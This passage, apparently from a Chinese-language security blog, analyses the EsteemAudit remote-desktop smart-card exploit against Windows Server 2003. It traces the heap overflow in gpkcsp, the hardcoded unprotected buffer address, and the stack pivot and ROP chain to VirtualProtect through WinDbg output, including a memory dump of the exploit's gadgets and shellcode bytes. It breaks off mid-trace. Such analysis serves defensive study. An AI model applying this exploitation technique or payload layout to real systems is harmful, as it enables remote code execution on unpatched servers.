4943&nbsp;-&gt;PAKID_CORE_DEVICE_IOCOMPLETION&nbsp;0x4943</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在RDPDR模块中，我们可以看到虚表虚表中的函数被用来识别和处理数据包</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0107aac5d9a2b3e537.png" title="t01c043b9f9141c76d7.png" alt="http://p7.qhimg.com/t01c043b9f9141c76d7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果服务器端收到了被标记为RDPDR_HEADER的数据包，对应的类会调用RecognizePacket函数</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0173ae8fa145ed5264.png" title="t01056ea819649a68bd.png" alt="http://p2.qhimg.com/t01056ea819649a68bd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EsteemAudit发送的缓冲区溢出数据包和漏洞利用数据包设置了0x49434472的标志位。0x4472被设备重定向核心组件(Device redirector core component)使用，0x4943用来做Device I/O响应。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0104c29563a4eab094.png" title="t01f00467c76fd43598.png" alt="http://p4.qhimg.com/t01f00467c76fd43598.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在识别数据包类型后，rdpdr!DrSession::ReadCompletion会调用HandlePacket来解析数据包。我们可以看到OnDeviceControlCompletion函数处理数据包头部。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01a0eabf7d9432b3ba.png" title="t019506a527f8682e2f.png" alt="http://p1.qhimg.com/t019506a527f8682e2f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在处理完数据包后，我们可以看到rdpdr!DrDevice::CompleteRxContext通过IO通知已经处理完成相关的数据包。其他模块被通知继续处理剩下的数据包，在这里是pbExtraBytes。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01bfce42501996a968.png" title="t01ddfc8664c31a638f.png" alt="http://p8.qhimg.com/t01ddfc8664c31a638f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用户态</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在用户态中，winlogon.exe调用了智能卡模块，类似gpkcsp，scredir和winscard来和客户端进行交互。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们看看函数调用栈。这个调用栈是从内核态向用户态拷贝用户发送的数据pbExtraBytes时的。我们可以看到客户端发送到服务器端的数据从内核态进入用户态的流程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:003&gt;&nbsp;k
ChildEBP&nbsp;RetAddr
00fce058&nbsp;5cd45619&nbsp;scredir!_CopyReturnToCallerBuffer
00fce104&nbsp;723642b0&nbsp;scredir!SCardTransmit+0x194
00fce180&nbsp;08005c32&nbsp;WinSCard!SCardTransmit+0x76
00fce1b0&nbsp;0800921d&nbsp;gpkcsp!DoSCardTransmit+0x3d
00fce41c&nbsp;0800e2dd&nbsp;gpkcsp!WriteTimestamps+0x679
00fcf39c&nbsp;08004acb&nbsp;gpkcsp!MyCPAcquireContext+0x817
00fcf708&nbsp;77f50909&nbsp;gpkcsp!CPAcquireContext+0x26e
00fcf7cc&nbsp;77f50a5f&nbsp;ADVAPI32!CryptAcquireContextA+0x55f
00fcf834&nbsp;0103fd78&nbsp;ADVAPI32!CryptAcquireContextW+0xa4
00fcf864&nbsp;0104086c&nbsp;winlogon!CSCLogonInit::CryptCtx+0x75
00fcf874&nbsp;010408c1&nbsp;winlogon!CSCLogonInit::RelinquishCryptCtx+0x10
00fcf898&nbsp;0103a8f5&nbsp;winlogon!ScHelperGetCertFromLogonInfo+0x22
00fcf8bc&nbsp;77c50193&nbsp;winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x3f
00fcf8e0&nbsp;77cb33e1&nbsp;RPCRT4!Invoke+0x30
00fcfce0&nbsp;77cb35c4&nbsp;RPCRT4!NdrStubCall2+0x299
00fcfcfc&nbsp;77c4ff7a&nbsp;RPCRT4!NdrServerCall2+0x19
00fcfd30&nbsp;77c7e732&nbsp;RPCRT4!DispatchToStubInCNoAvrf+0x38
00fcfd48&nbsp;77c5042d&nbsp;RPCRT4!DispatchToStubInCAvrf+0x14
00fcfd9c&nbsp;77c50353&nbsp;RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x11f
00fcfdc0&nbsp;77c511dc&nbsp;RPCRT4!RPC_INTERFACE::DispatchToStub+0xa3
00fcfdfc&nbsp;77c512f0&nbsp;RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x42c
00fcfe20&nbsp;77c58678&nbsp;RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x127
00fcff84&nbsp;77c58792&nbsp;RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x430
00fcff8c&nbsp;77c5872d&nbsp;RPCRT4!RecvLotsaCallsWrapper+0xd
00fcffac&nbsp;77c4b110&nbsp;RPCRT4!BaseCachedThreadRoutine+0x9d
00fcffb8&nbsp;7c824829&nbsp;RPCRT4!ThreadStartRoutine+0x1b
WARNING:&nbsp;Stack&nbsp;unwind&nbsp;information&nbsp;not&nbsp;available.&nbsp;Following&nbsp;frames&nbsp;may&nbsp;be&nbsp;wrong.
00fcffec&nbsp;00000000&nbsp;kernel32!GetModuleHandleA+0xdf</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">gpkcsp!MyCPAcquireContext这个函数是负责发送，接受和处理智能卡数据包的，且与EsteemAudit中的函数RecvProcessSendPackets是相关的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在介绍这个函数前，我们先看看scredir!SCardTransmit。这个函数被函数gpkcsp!DoSCardTransmit调用，是发送和接受智能卡数据的基础函数。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t013e2a251c9abe4de0.png" title="t019c283ef2f91ca1af.png" alt="http://p6.qhimg.com/t019c283ef2f91ca1af.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">函数_SendSCardIOCTL的第一个参数为0x900d0代表SCARD_IOCTL_TRANSMIT。发送数据的和接受数据的数据结构_Transmit_Call和_Transmit_Return之前已经介绍过了。随后Transmit_Return_Decode会解码并处理从内核中得到的数据。scredir!_CopyReturnToCallerBuffe这个函数拷贝的数据来自于客户端发送的数据，且为保存在地址0x080190d8中的全局变量。这意味这缓冲区溢出数据包和漏洞利用数据包的数据将会被拷贝到地址0x080190d8中。这就是为什么在缓冲区溢出数据包和漏洞利用数据包中有这个地址被硬编码地址的原因。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t019ca36e96f744cc78.png" title="t015c74be0a11e4e603.png" alt="http://p1.qhimg.com/t015c74be0a11e4e603.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来我们介绍gpkcsp!MyCPAcquireContext函数和整个的利用过程。函数SCardEstablishContext和ConnectToCard的细节不在此阐述，不过我们会介绍程序处理缓冲区溢出包的流程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个名为ProvCont的全局变量，被存储在大小是0x24a8的堆中</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:003&gt;&nbsp;dc&nbsp;gpkcsp!ProvCont&nbsp;(08176dd8)
08176dd8&nbsp;&nbsp;02cdcb58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;X…
0:003&gt;&nbsp;!heap&nbsp;-p&nbsp;-a&nbsp;0x2cdcb58
address&nbsp;02cdcb58&nbsp;found&nbsp;in
_DPH_HEAP_ROOT&nbsp;@&nbsp;3a1000
in&nbsp;busy&nbsp;allocation&nbsp;(&nbsp;&nbsp;DPH_HEAP_BLOCK:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UserAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UserSize&nbsp;–&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtSize)
3a3c80:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2cdcb58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24a8&nbsp;–&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2cdc000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4000
7c96d97a&nbsp;ntdll!RtlAllocateHeap+0x00000e9f
77b8d08c&nbsp;msvcrt!malloc+0x0000006c
08012599&nbsp;gpkcsp!GMEM_Alloc+0x0000000e
0800a937&nbsp;gpkcsp!DllMain+0x00000090
080120fc&nbsp;gpkcsp!_DllMainCRTStartup+0x00000052
7c94a352&nbsp;ntdll!LdrpCallInitRoutine+0x00000014
7c963465&nbsp;ntdll!LdrpRunInitializeRoutines+0x00000367
7c964311&nbsp;ntdll!LdrpLoadDll+0x000003cd
7c964065&nbsp;ntdll!LdrLoadDll+0x00000198
7c801bf3&nbsp;kernel32!LoadLibraryExW+0x000001b2
7c801dbd&nbsp;kernel32!LoadLibraryExA+0x0000001f
7c801df3&nbsp;kernel32!LoadLibraryA+0x000000b5
77f42fef&nbsp;ADVAPI32!CryptAcquireContextA+0x0000045c
77f50a5f&nbsp;ADVAPI32!CryptAcquireContextW+0x000000a4
0103fd78&nbsp;winlogon!CSCLogonInit::CryptCtx+0x00000075
0104086c&nbsp;winlogon!CSCLogonInit::RelinquishCryptCtx+0x00000010
010408c1&nbsp;winlogon!ScHelperGetCertFromLogonInfo+0x00000022
0103a8f5&nbsp;winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x0000003f
77c50193&nbsp;RPCRT4!Invoke+0x00000030
77cb33e1&nbsp;RPCRT4!NdrStubCall2+0x00000299
77cb35c4&nbsp;RPCRT4!NdrServerCall2+0x00000019
77c4ff7a&nbsp;RPCRT4!DispatchToStubInCNoAvrf+0x00000038
77c7e732&nbsp;RPCRT4!DispatchToStubInCAvrf+0x00000014
77c5042d&nbsp;RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x0000011f
77c50353&nbsp;RPCRT4!RPC_INTERFACE::DispatchToStub+0x000000a3
77c511dc&nbsp;RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x0000042c
77c512f0&nbsp;RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x00000127
77c58678&nbsp;RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x00000430
77c58792&nbsp;RPCRT4!RecvLotsaCallsWrapper+0x0000000d
77c5872d&nbsp;RPCRT4!BaseCachedThreadRoutine+0x0000009d
77c4b110&nbsp;RPCRT4!ThreadStartRoutine+0x0000001b
7c824829&nbsp;kernel32!BaseThreadStart+0x00000034</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01fd3b542e109f3bf7.png" title="t0165c28ec3d07cd3de.png" alt="http://p8.qhimg.com/t0165c28ec3d07cd3de.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">调用DoSCardTransmit处理缓冲区溢出数据包并将数据包保存在0x080190d8后，MyCPAcquireContext初始化KeyData(0x80)并且从0x080190d8拷贝客户端发送的数据(大小为0x2b-7)到这块内存中</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01757613321e8afc77.png" title="t01df1fb6a8c59d2629.png" alt="http://p1.qhimg.com/t01df1fb6a8c59d2629.png"/></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01f4bd1f34224069ea.png" title="t015d8772af1b12bd8d.png" alt="http://p4.qhimg.com/t015d8772af1b12bd8d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过调试可以看到key_object的溢出情况</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:003&gt;&nbsp;dc&nbsp;02cdcb58+a0+b8-20
02cdcc90&nbsp;&nbsp;b7314210&nbsp;544f2b0f&nbsp;34059cf0&nbsp;ead224e5&nbsp;&nbsp;.B1..+OT…4.$..
02cdcca0&nbsp;&nbsp;22ef2496&nbsp;b2dcb268&nbsp;9c36556f&nbsp;159e7181&nbsp;&nbsp;.$.”h…oU6..q..
02cdccb0&nbsp;&nbsp;080190dc&nbsp;00009000&nbsp;70e2a252&nbsp;b67b7cc7&nbsp;&nbsp;……..R..p.|{.
02cdccc0&nbsp;&nbsp;62937b2c&nbsp;afe0bbbd&nbsp;93606931&nbsp;dcdba152&nbsp;&nbsp;,{.b….1i`.R…
02cdccd0&nbsp;&nbsp;00cd84d1&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
02cdcce0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
02cdccf0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
02cdcd00&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在溢出keyobject后，我们可以观察gpkcsp!MyCPAcquireContext如何处理接下来的数据包和EIP是如何被控制的。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01f4247ae38eaa6388.png" title="t01ab2a178076909adb.png" alt="http://p9.qhimg.com/t01ab2a178076909adb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们注意到一个没有符号信息的函数sub_8009094调用DoSCardTransmit并拷贝expbuffer到0x080x90d8中，在Windows2003中这个地址没有ASLR保护并且存放用户发送的数据包中的原始数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:003&gt;&nbsp;dc&nbsp;080190d8&nbsp;L1c0/4
080190d8&nbsp;&nbsp;d26ccf61&nbsp;08011e7a&nbsp;0801118e&nbsp;08005e85&nbsp;&nbsp;a.l.z……..^..
080190e8&nbsp;&nbsp;0800bedd&nbsp;11111111&nbsp;9d273fbe&nbsp;e636c0ea&nbsp;&nbsp;………?’…6.
080190f8&nbsp;&nbsp;00000000&nbsp;b02838fd&nbsp;08011fef&nbsp;08019078&nbsp;&nbsp;…..8(…..x…
08019108&nbsp;&nbsp;3005123c&nbsp;22222222&nbsp;00000000&nbsp;f7a1d915&nbsp;&nbsp;&lt;..0″”””……..
08019118&nbsp;&nbsp;00004000&nbsp;080128cc&nbsp;0000008f&nbsp;7ffe0300&nbsp;&nbsp;.@…(……….
08019128&nbsp;&nbsp;08015074&nbsp;08019148&nbsp;08019118&nbsp;ffffffff&nbsp;&nbsp;tP..H………..
08019138&nbsp;&nbsp;08019130&nbsp;08019118&nbsp;00000040&nbsp;08019130&nbsp;&nbsp;0…….@…0…
08019148&nbsp;&nbsp;8b6404b0&nbsp;06002d00&nbsp;c4890000&nbsp;00e8c689&nbsp;&nbsp;..d..-……….
08019158&nbsp;&nbsp;90000000&nbsp;d5858b5d&nbsp;89000000&nbsp;858b0446&nbsp;&nbsp;….]…….F…
08019168&nbsp;&nbsp;000000d9&nbsp;310c4689&nbsp;104689c0&nbsp;8b144689&nbsp;&nbsp;…..F.1..F..F..
08019178&nbsp;&nbsp;0000dd85&nbsp;8b008b00&nbsp;0000bc80&nbsp;18468900&nbsp;&nbsp;…………..F.
08019188&nbsp;&nbsp;00e1858b&nbsp;008b0000&nbsp;8b1c4689&nbsp;0000e585&nbsp;&nbsp;………F……
08019198&nbsp;&nbsp;89008b00&nbsp;468b2046&nbsp;2846890c&nbsp;4689c031&nbsp;&nbsp;….F&nbsp;.F..F(1..F
080191a8&nbsp;&nbsp;00b5e82c&nbsp;c0850000&nbsp;468b6675&nbsp;0846892c&nbsp;&nbsp;,…….uf.F,.F.
080191b8&nbsp;&nbsp;2b0c468b&nbsp;89501046&nbsp;468b50e0&nbsp;10460308&nbsp;&nbsp;.F.+F.P..P.F..F.
080191c8&nbsp;&nbsp;50c03150&nbsp;ff1476ff&nbsp;76ff0476&nbsp;1876ff20&nbsp;&nbsp;P1.P.v..v..v&nbsp;.v.
080191d8&nbsp;&nbsp;591c56ff&nbsp;8b144689&nbsp;c8011046&nbsp;8b104689&nbsp;&nbsp;.V.Y.F..F….F..
080191e8&nbsp;&nbsp;46890846&nbsp;10468b24&nbsp;00d9853b&nbsp;c07c0000&nbsp;&nbsp;F..F$.F.;…..|.
080191f8&nbsp;&nbsp;4689c031&nbsp;244e8b10&nbsp;0189c889&nbsp;0471ff51&nbsp;&nbsp;1..F..N$….Q.q.
08019208&nbsp;&nbsp;c083c889&nbsp;d0ff5014&nbsp;03ebc031&nbsp;5048c031&nbsp;&nbsp;…..P..1…1.HP
08019218&nbsp;&nbsp;852c468b&nbsp;8b0e74c0&nbsp;58e81058&nbsp;85000000&nbsp;&nbsp;.F,..t..X..X….
08019228&nbsp;&nbsp;ff0274db&nbsp;c3e431d3&nbsp;080192d8&nbsp;00006346&nbsp;&nbsp;.t…1……Fc..
08019238&nbsp;&nbsp;08176dd8&nbsp;0800119c&nbsp;080011cc&nbsp;000012b8&nbsp;&nbsp;.m…………..
08019248&nbsp;&nbsp;24548d00&nbsp;c22ecd04&nbsp;18c20018&nbsp;0057b800&nbsp;&nbsp;..T$……….W.
08019258&nbsp;&nbsp;548d0000&nbsp;2ecd0424&nbsp;6a0010c2&nbsp;30006840&nbsp;&nbsp;…T$……j@h.0
08019268&nbsp;&nbsp;468d0000&nbsp;c0315028&nbsp;2c468d50&nbsp;48c03150&nbsp;&nbsp;…F(P1.P.F,P1.H
08019278&nbsp;&nbsp;ffc6e850&nbsp;68c3ffff&nbsp;00008000&nbsp;5028468d&nbsp;&nbsp;P……h…..F(P
08019288&nbsp;&nbsp;502c468d&nbsp;5048c031&nbsp;ffffc0e8&nbsp;6578c3ff&nbsp;&nbsp;.F,P1.HP……xe</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当漏洞利用数据包中的数据部署完成后，gpkcsp!MyCPAcquireContext处理ReleaseProvider路径。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此时在函数CryptDestroyKey中会利用C++类的虚表完成虚函数调用KeyObject-&gt;release</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t018ab87665f283b901.png" title="t018ab87665f283b901.png" alt="http://p7.qhimg.com/t018ab87665f283b901.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来的调试信息展示了如何控制EIP和执行shellcode。这个exploit利用了SharedUserData技术去调用KiFastSystemCall来执行函数VirtualProtect，将内存0x80190d8的属性设置成可写和执行，然后在地址0x8019148执行shellcode。这时exploit就完成了第一阶段的工作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:011&gt;&nbsp;g&nbsp;08007c2b
eax=080190dc&nbsp;ebx=77f3f5b0&nbsp;ecx=02cdaff8&nbsp;edx=00000000&nbsp;esi=000000b8&nbsp;edi=00000000
eip=08007c2b&nbsp;esp=02dfe40c&nbsp;ebp=02dfe420&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!ReleaseProvider+0xef:
08007c2b&nbsp;ffd3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;ebx&nbsp;{ADVAPI32!CryptDestroyKey&nbsp;(77f3f5b0)}
0:011&gt;
eax=00000001&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=080190dc&nbsp;edi=08019078
eip=77f3f615&nbsp;esp=02dfe3c0&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
ADVAPI32!CryptDestroyKey+0x6e:
77f3f615&nbsp;ff5608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+8]&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:080190e4=08005e85
0:011&gt;&nbsp;t
eax=00000001&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=080190dc&nbsp;edi=08019078
eip=08005e85&nbsp;esp=02dfe3bc&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!GetAppWindow+0x1c:
08005e85&nbsp;8bc6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,esi
0:011&gt;
eax=080190dc&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=080190dc&nbsp;edi=08019078
eip=08005e87&nbsp;esp=02dfe3bc&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!GetAppWindow+0x1e:
08005e87&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi
0:011&gt;
eax=080190dc&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=08005e88&nbsp;esp=02dfe3c0&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!GetAppWindow+0x1f:
08005e88&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:011&gt;&nbsp;t
eax=080190dc&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=0800bedd&nbsp;esp=02dfe3c4&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!funcCheck+0x129:
0800bedd&nbsp;94&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;&nbsp;&nbsp;eax,esp
0:011&gt;&nbsp;t
eax=02dfe3c4&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=0800bede&nbsp;esp=080190dc&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!funcCheck+0x12a:
0800bede&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:011&gt;&nbsp;t
eax=02dfe3c4&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=08011e7a&nbsp;esp=080190e0&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!MyCPSignHash+0x3ac:
